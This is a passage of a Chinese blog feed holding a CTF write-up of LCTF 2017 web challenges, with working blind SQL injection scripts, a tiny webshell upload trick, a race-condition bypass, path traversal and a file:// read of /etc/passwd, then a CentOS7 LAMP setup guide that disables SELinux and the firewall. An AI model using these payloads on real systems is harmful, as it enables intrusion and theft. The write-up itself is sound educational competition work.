class="string">'content'</span>]))&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"&lt;h1&gt;"</span>.$row[<span class="string">'title'</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;"</span>.$row[<span class="string">'content'</span>];</div><div class="line">	<span class="keyword">die</span>();</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">"This article does not exist."</span>);</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p>
<p>看到用了sprintf格式化字符串，想到<a href="https://www.codemonster.cn/2017/10/31/2017-3th-fjwlkjaqds-writeup/">省赛的注入题</a><br>测试了一下<code>%1$&#39;</code>可以成功逃逸单引号，构造盲注脚本如下，在web1.key的f14g字段找到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment">#-*- coding: utf-8 -*-</span></div><div class="line"><span class="comment">#by:CodeMonster</span></div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</div><div class="line">payload=list(<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ@1234567890qwertyuiopasdfghjklzxcvbnm_&#123;&#125;.!,"</span>)</div><div class="line">data=<span class="string">''</span></div><div class="line">flag=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> s <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">50</span>):</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">1</span>,<span class="number">50</span>):</div><div class="line">		<span class="keyword">for</span> p <span class="keyword">in</span> payload:</div><div class="line">			header=&#123;<span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=b1kkq3ohuavj53kkl4u29dg914; token=SUIEVxUzVHYpEQEOFFIiXQ==;"</span>&#125;</div><div class="line">			url=<span class="string">"http://111.231.111.54/admin.php?id=1&amp;title="</span></div><div class="line">			<span class="comment">#url+="%1$%27%20or%20(ascii(mid((select%20group_concat(column_NAME)%20from%20information_schema.COLUMNS%20where%20TABLE_SCHEMA=database()%20and%20table_name=0x6b6579),&#123;0&#125;,1))=&#123;1&#125;)%23".format(i,ord(p))</span></div><div class="line">			url+=<span class="string">"%1$%27%20or%20(ascii(mid((select%20f14g%20from%20web1.key),&#123;0&#125;,1))=&#123;1&#125;)%23"</span>.format(i,ord(p))</div><div class="line">			<span class="comment">#print url</span></div><div class="line">			r1=r.get(url,headers=header)</div><div class="line">			<span class="comment">#print r1.text</span></div><div class="line">			<span class="keyword">if</span> <span class="string">"myblog"</span> <span class="keyword">in</span> r1.text:</div><div class="line">				flag+=p</div><div class="line">				<span class="keyword">print</span> i,flag</div><div class="line">				<span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure>
<h1 id="“他们”有什么秘密呢"><a href="#“他们”有什么秘密呢" class="headerlink" title="“他们”有什么秘密呢?"></a>“他们”有什么秘密呢?</h1><p>一个简单到不能再简单的……<br><a href="http://182.254.246.93/" target="_blank" rel="noopener">http://182.254.246.93/</a></p>
<p>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.entrance.php</div><div class="line">2.There is no need to scan and brute force!</div><div class="line">3.Hacking for fun!</div></pre></td></tr></table></figure></p>
<h2 id="0x00各种注入骚操作得到下一关文件名"><a href="#0x00各种注入骚操作得到下一关文件名" class="headerlink" title="0x00各种注入骚操作得到下一关文件名"></a>0x00各种注入骚操作得到下一关文件名</h2><p>entrance.php存在报错注入<br>构造<code>1 and linestring(pro_id)</code>得到表名<code>product_2017ctf</code>和数据库名<code>youcanneverfindme17</code><br>通过join注入得到字段名<code>d067a0fa9dc61a6e</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pro_id=1 and (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id,pro_name,owner)) as c);</div></pre></td></tr></table></figure></p>
<p>但是这个字段名被ban了，只好通过order by来得到d067a0fa9dc61a6e字段的内容，脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment">#-*- coding: utf-8 -*-</span></div><div class="line"><span class="comment">#by:CodeMonster</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line">r=requests.session()</div><div class="line">url=<span class="string">"http://182.254.246.93/entrance.php?"</span></div><div class="line">l=<span class="string">".0123456789abcdefghijklmnopqrstuvwxyz"</span></div><div class="line">k=<span class="string">""</span></div><div class="line">sec=<span class="string">""</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>):</div><div class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(len(l)):</div><div class="line">		payload=sec+l[j]</div><div class="line">		data=&#123;<span class="string">"pro_id"</span>:<span class="string">"3 union select 1,'test',4,'&#123;&#125;' from product_2017ctf order by 4"</span>.format(payload)&#125;</div><div class="line">		r1=r.post(url,data=data)</div><div class="line">		<span class="keyword">if</span> <span class="string">'nextentrance'</span> <span class="keyword">in</span> r1.text:</div><div class="line">			sec+=k</div><div class="line">			<span class="keyword">print</span> payload</div><div class="line">			<span class="keyword">break</span></div><div class="line">		k=l[j]</div><div class="line">		<span class="keyword">if</span> j==len(l)<span class="number">-1</span>:</div><div class="line">			sec+=k</div></pre></td></tr></table></figure></p>
<p>得到的内容和字段名拼接得到<code>d067a0fa9dc61a6e7195ca99696b5a896.php</code></p>
<h2 id="0x01七个字符getshell"><a href="#0x01七个字符getshell" class="headerlink" title="0x01七个字符getshell"></a>0x01七个字符getshell</h2><p>d067a0fa9dc61a6e7195ca99696b5a896.php是个类似上传的页面，可以在服务器的一个专属文件夹生成指定文件名和内容的文件，一开始以为可以通过<code>content[]</code>绕过长度限制，无果，然后google到了原题<br><a href="http://c.colabug.com/article-2421-1.html" target="_blank" rel="noopener">http://c.colabug.com/article-2421-1.html</a><br>传三个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">文件名    内容</div><div class="line">bash      随意</div><div class="line">bb        7个字符内的命令</div><div class="line">z.php     &lt;?=`*`;</div></pre></td></tr></table></figure></p>
<p><code>z.php</code>中的<code>&lt;?=`*`;</code>刚好7个字符，访问后能把当前目录下的所有文件按字母顺序列出，然后执行。<br>传好上面3个文件后，当前文件夹就有4个文件了，按字母排序如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash bb index.html(题目自带) z.php</div></pre></td></tr></table></figure></p>
<p>访问z.php后，相当于执行了<code>bash bb index.php z.php</code><br>所以我们只需要通过修改bb来执行7个字符以内的命令<br>bb的内容分别为<code>ls /</code>和<code>cat /3*</code><br><img src="/img/2017lctf1.png" alt=""></p>
<h1 id="萌萌哒报名系统"><a href="#萌萌哒报名系统" class="headerlink" title="萌萌哒报名系统"></a>萌萌哒报名系统</h1><p>天依花了一整天的时间用IDE开发了一个报名系统，现在她睡着了，难道你们不想做点什么嘛XD?<br><a href="http://123.206.120.239/" target="_blank" rel="noopener">http://123.206.120.239/</a></p>
<h2 id="0x00下载源码"><a href="#0x00下载源码" class="headerlink" title="0x00下载源码"></a>0x00下载源码</h2><p>提示了IDE开发<br>扫到了<code>http://123.206.120.239/.idea/workspace.xml</code><br><img src="/img/2017lctf5.png" alt=""><br>下载到了源码<br>login.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	session_start();</div><div class="line">	<span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line">	<span class="keyword">try</span>&#123;</div><div class="line">		$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=xdcms'</span>, $user, $pass);</div><div class="line">	&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</div><div class="line">	&#125;</div><div class="line">	$username = (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'username'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'username'</span>] : <span class="keyword">die</span>(<span class="string">'Missing username'</span>);</div><div class="line">    $password = (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'password'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'password'</span>] : <span class="keyword">die</span>(<span class="string">'Missing password'</span>);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (strlen($username) &gt; <span class="number">32</span> || strlen($password) &gt; <span class="number">32</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'Invalid input'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $sth = $pdo-&gt;prepare(<span class="string">'SELECT password FROM users WHERE username = :username'</span>);</div><div class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</div><div class="line">    <span class="keyword">if</span> ($sth-&gt;fetch()[<span class="number">0</span>] !== $password) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'wrong password'</span>);</div><div class="line">    &#125;</div><div class="line">    $_SESSION[<span class="string">'username'</span>] = $username;</div><div class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">'is_logined'</span>]);</div><div class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">'is_guest'</span>]);</div><div class="line">	<span class="comment">#echo $username;</span></div><div class="line">	header(<span class="string">"Location: member.php"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>member.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	error_reporting(<span class="number">0</span>);</div><div class="line">	session_start();</div><div class="line">	<span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]) === <span class="keyword">false</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'please login first'</span>);</div><div class="line">    &#125;</div><div class="line">	<span class="keyword">try</span>&#123;</div><div class="line">		$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=xdcms'</span>, $user, $pass);</div><div class="line">	&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</div><div class="line">	&#125;</div><div class="line">    $sth = $pdo-&gt;prepare(<span class="string">'SELECT identity FROM identities WHERE username = :username'</span>);</div><div class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $_SESSION[<span class="string">'username'</span>]]);</div><div class="line">    <span class="keyword">if</span> ($sth-&gt;fetch()[<span class="number">0</span>] === <span class="string">'GUEST'</span>) &#123;</div><div class="line">        $_SESSION[<span class="string">'is_guest'</span>] = <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $_SESSION[<span class="string">'is_logined'</span>] = <span class="keyword">true</span>;</div><div class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'is_logined'</span>]) === <span class="keyword">false</span> || <span class="keyword">isset</span>($_SESSION[<span class="string">'is_guest'</span>]) === <span class="keyword">true</span>) &#123;</div><div class="line"></div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])===<span class="keyword">false</span>)</div><div class="line">			<span class="keyword">echo</span> <span class="string">"None"</span>;</div><div class="line">		<span class="keyword">elseif</span>(is_file($_GET[<span class="string">'file'</span>]))</div><div class="line">			<span class="keyword">echo</span> <span class="string">"you cannot give me a file"</span>;</div><div class="line">		<span class="keyword">else</span></div><div class="line">			readfile($_GET[<span class="string">'file'</span>]);</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body background=<span class="string">"./images/1.jpg"</span>&gt;</div><div class="line">&lt;object type=<span class="string">"application/x-shockwave-flash"</span> style=<span class="string">"outline:none;"</span> data=<span class="string">"http://cdn.abowman.com/widgets/hamster/hamster.swf?"</span> width=<span class="string">"300"</span> height=<span class="string">"225"</span>&gt;&lt;param name=<span class="string">"movie"</span> value=<span class="string">"http://cdn.abowman.com/widgets/hamster/hamster.swf?"</span>&gt;&lt;/param&gt;&lt;param name=<span class="string">"AllowScriptAccess"</span> value=<span class="string">"always"</span>&gt;&lt;/param&gt;&lt;param name=<span class="string">"wmode"</span> value=<span class="string">"opaque"</span>&gt;&lt;/param&gt;&lt;/object&gt;</div><div class="line">&lt;p style=<span class="string">"color:orange"</span>&gt;你好啊，但是你好像不是XDSEC的人,所以我就不给你flag啦~~&lt;/p&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>register.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line">	<span class="keyword">try</span>&#123;</div><div class="line">		$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=xdcms'</span>, $user, $pass);</div><div class="line">	&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</div><div class="line">	&#125;</div><div class="line">	$admin = <span class="string">"xdsec"</span>.<span class="string">"###"</span>.str_shuffle(<span class="string">'you_are_the_member_of_xdsec_here_is_your_flag'</span>);</div><div class="line">    $username = (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'username'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'username'</span>] : <span class="keyword">die</span>(<span class="string">'Missing username'</span>);</div><div class="line">    $password = (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'password'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'password'</span>] : <span class="keyword">die</span>(<span class="string">'Missing password'</span>);</div><div class="line">    $code = (<span class="keyword">isset</span>($_POST[<span class="string">'code'</span>]) === <span class="keyword">true</span>) ? (string)$_POST[<span class="string">'code'</span>] : <span class="string">''</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (strlen($username) &gt; <span class="number">16</span> || strlen($username) &gt; <span class="number">16</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'Invalid input'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $sth = $pdo-&gt;prepare(<span class="string">'SELECT username FROM users WHERE username = :username'</span>);</div><div class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</div><div class="line">    <span class="keyword">if</span> ($sth-&gt;fetch() !== <span class="keyword">false</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'username has been registered'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO users (username, password) VALUES (:username, :password)'</span>);</div><div class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username, <span class="string">':password'</span> =&gt; $password]);</div><div class="line"></div><div class="line">    preg_match(<span class="string">'/^(xdsec)((?:###|\w)+)$/i'</span>, $code, $matches);</div><div class="line">    <span class="keyword">if</span> (count($matches) === <span class="number">3</span> &amp;&amp; $admin === $matches[<span class="number">0</span>]) &#123;</div><div class="line">        $sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO identities (username, identity) VALUES (:username, :identity)'</span>);</div><div class="line">        $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username, <span class="string">':identity'</span> =&gt; $matches[<span class="number">1</span>]]);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO identities (username, identity) VALUES (:username, "GUEST")'</span>);</div><div class="line">        $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</div><div class="line">    &#125;</div><div class="line">  <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("register success");location.href="./index.html"&lt;/script&gt;'</span>;</div></pre></td></tr></table></figure></p>
<h2 id="0x01竞争绕过身份检测"><a href="#0x01竞争绕过身份检测" class="headerlink" title="0x01竞争绕过身份检测"></a>0x01竞争绕过身份检测</h2><p>一开始一直以为要预测<code>str_shuffle()</code>打乱的字符串，无果，分析代码发现注册的时候是先将<code>用户名密码插入数据库</code>，再判断注册码是否正确，然后插入用户身份，而member.php中判断用户身份的逻辑用的是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ($sth-&gt;fetch()[<span class="number">0</span>] === <span class="string">'GUEST'</span>) &#123;</div><div class="line">  $_SESSION[<span class="string">'is_guest'</span>] = <span class="keyword">true</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>只要不为<code>GUEST</code>即可执行后面的代码<br>想到通过竞争，在<code>GUEST</code>还没更新进数据库的时候就登录并访问member.php，从而跳过身份验证<br>这里我的操作是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.burpsuite Intruder无限POST login.php进行登录操作</div><div class="line">2.burpsuite Intruder无限GET member.php</div><div class="line">3.在前面两个都在跑的情况下注册一个账号</div></pre></td></tr></table></figure></p>
<p>要注意的是三个操作的cookie必须相同，1和3中的账号密码要相同，这样在注册的同时就完成了登录操作并且访问了member并绕过身份检测可以执行下一部分代码<br>emmmmmmmm，看了操作和flag的内容，感觉我用了非预期解，预期解应该是通过输入超长的<code>xdsec###</code>开头的字符串让regiest.php中的正则匹配函数崩溃，从而无法注入用户GUEST身份，后面的就都一样了</p>
<h2 id="0x02文件包含读取config-php"><a href="#0x02文件包含读取config-php" class="headerlink" title="0x02文件包含读取config.php"></a>0x02文件包含读取config.php</h2><p>关键代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])===<span class="keyword">false</span>)</div><div class="line">	<span class="keyword">echo</span> <span class="string">"None"</span>;</div><div class="line"><span class="keyword">elseif</span>(is_file($_GET[<span class="string">'file'</span>]))</div><div class="line">	<span class="keyword">echo</span> <span class="string">"you cannot give me a file"</span>;</div><div class="line"><span class="keyword">else</span></div><div class="line">  readfile($_GET[<span class="string">'file'</span>]);</div></pre></td></tr></table></figure></p>
<p>这里构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?file=./x/../config.php</div></pre></td></tr></table></figure></p>
<p>因为x文件夹不存在，所以就能绕过<code>is_file()</code>读取到<code>config.php</code>，flag就在里面<br><img src="/img/2017lctf6.png" alt=""></p>
<h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p>这是一个拼手速抢邀请码的题<br><a href="http://211.159.161.162/test.php" target="_blank" rel="noopener">http://211.159.161.162/test.php</a><br>hint: 本地</p>
<p>这道题相对没前面的复杂，fuzz发现只能提交<code>协议名://www.baidu.com</code>这样的值，否则error<br>构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?site=file://www.baidu.com/etc/passwd%23</div></pre></td></tr></table></figure></p>
<p>成功读取<code>/etc/passwd</code>，发现lctf用户，再用相同方法读取<code>/home/lctf/flag</code>得到flag<br><img src="/img/2017lctf3.png" alt=""></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>周末打了两天还是学到了很多骚操作，但是没有逆向和pwn的分数所以分数差很多，最后还是膜一下各位大佬们~</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;周末刚刚结束的LCTF，我们队一共做出了4道web，一道misc还有一道问卷调查（好气啊没抢到一血换pwnhub邀请码），感谢&lt;code&gt;吃饭去&lt;/code&gt;大佬带飞~&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="注入" scheme="https://www.codemonster.cn/tags/%E6%B3%A8%E5%85%A5/"/>
    
      <category term="Web" scheme="https://www.codemonster.cn/tags/Web/"/>
    
      <category term="Misc" scheme="https://www.codemonster.cn/tags/Misc/"/>
    
      <category term="CBC字节翻转攻击" scheme="https://www.codemonster.cn/tags/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
    
      <category term="Padding oracle攻击" scheme="https://www.codemonster.cn/tags/Padding-oracle%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>Centos7搭建LAMP环境</title>
    <link href="https://www.codemonster.cn/2017/11/16/lamp-creat/"/>
    <id>https://www.codemonster.cn/2017/11/16/lamp-creat/</id>
    <published>2017-11-16T14:40:09.000Z</published>
    <updated>2018-05-04T07:47:50.016Z</updated>
    
    <content type="html"><![CDATA[<p>很久之前帮老师写的LAMP（linux+apache+mysql+php）教程，自己也用这个方法配了好多台服务器，发到博客记录一下，也希望能给大家带来一些帮助。<br><a id="more"></a></p>
<h1 id="更新yum"><a href="#更新yum" class="headerlink" title="更新yum"></a>更新yum</h1><p>以全新centos7系统为例子（确保自己拥有root权限）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum update</div></pre></td></tr></table></figure></p>
<h1 id="PHP5-6安装"><a href="#PHP5-6安装" class="headerlink" title="PHP5.6安装"></a>PHP5.6安装</h1><h2 id="1、百度搜索webtatic-根据系统版本号选择yum源并安装"><a href="#1、百度搜索webtatic-根据系统版本号选择yum源并安装" class="headerlink" title="1、百度搜索webtatic  根据系统版本号选择yum源并安装"></a>1、百度搜索webtatic  根据系统版本号选择yum源并安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://webtatic.com/packages/php56/</div></pre></td></tr></table></figure>
<p>这里我选择了centos7的<code>php56</code>版本<br>运行如下语句<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm</div><div class="line">rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</div></pre></td></tr></table></figure></p>
<h2 id="2、安装php及其拓展"><a href="#2、安装php及其拓展" class="headerlink" title="2、安装php及其拓展"></a>2、安装php及其拓展</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">yum install php56w</div><div class="line">yum install php56w-devel</div><div class="line">yum install php56w-mysqli</div><div class="line">yum install php56w-mbstring</div><div class="line">yum install php56w-gd</div><div class="line">yum install php56w-xmlwriter</div></pre></td></tr></table></figure>
<p>一路按Y同意安装<br>以上安装会<code>默认执行编译安装Apache</code><br>若不确定自己服务器重使用了什么php拓展，请执行<code>yum install php56w*</code></p>
<h1 id="Apache-配置"><a href="#Apache-配置" class="headerlink" title="Apache 配置"></a>Apache 配置</h1><p>进入<code>/etc/httpd/conf.d</code>目录下，删除除<code>php.conf</code>以外文件<br>然后进行虚拟主机配置<br>在<code>/etc/httpd/conf.d/</code>目录新建任意一个conf文件，如<code>test.conf</code><br>创建的.conf文件内容如下，后续绑定域名什么的也是在这里<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:80</span>&gt;</span></div><div class="line">     ServerName 127.0.0.1:80   </div><div class="line">     DocumentRoot /work/WEBROOT/default/</div><div class="line">     ErrorLog  /work/log/default_error.log</div><div class="line">     CustomLog  /work/log/default_access.log combined</div><div class="line">     <span class="tag">&lt;<span class="name">Directory</span> "/<span class="attr">work</span>/<span class="attr">WEBROOT</span>/<span class="attr">default</span>"&gt;</span></div><div class="line">         AllowOverride All</div><div class="line">        Order allow,deny</div><div class="line">        Require all granted</div><div class="line">        Allow from all</div><div class="line">     <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>并根据实际情况建立web目录，如<code>/work/</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mkdir /work/WEBROOT/default -p</div><div class="line">mkdir /work/log/default -p</div></pre></td></tr></table></figure></p>
<p>并将网站文件放入<code>/work/WEBROOT/default/</code><br> 请确保web目录所属用户和所属用户组为<code>apache</code>,可用<code>chown</code>与<code>chgrp</code>命令更改<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">chown apache /work -R</div><div class="line">chgrp apache /work -R</div></pre></td></tr></table></figure></p>
<p>服务启动前，请确保防火墙对apache为开放权限，若不想配置防火墙策略，<br>请关闭selinux 与firewalld.service<br>分别为<br>修改<code>/etc/selinux/config</code>文件中设置<code>SELINUX=disabled</code> ，然后重启服务器。<br>和<code>systemctl disable firewalld</code><br>执行后请重启服务器</p>
<p>启动服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl start httpd.service</div></pre></td></tr></table></figure></p>
<p>加入开机启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl enable httpd.service</div></pre></td></tr></table></figure></p>
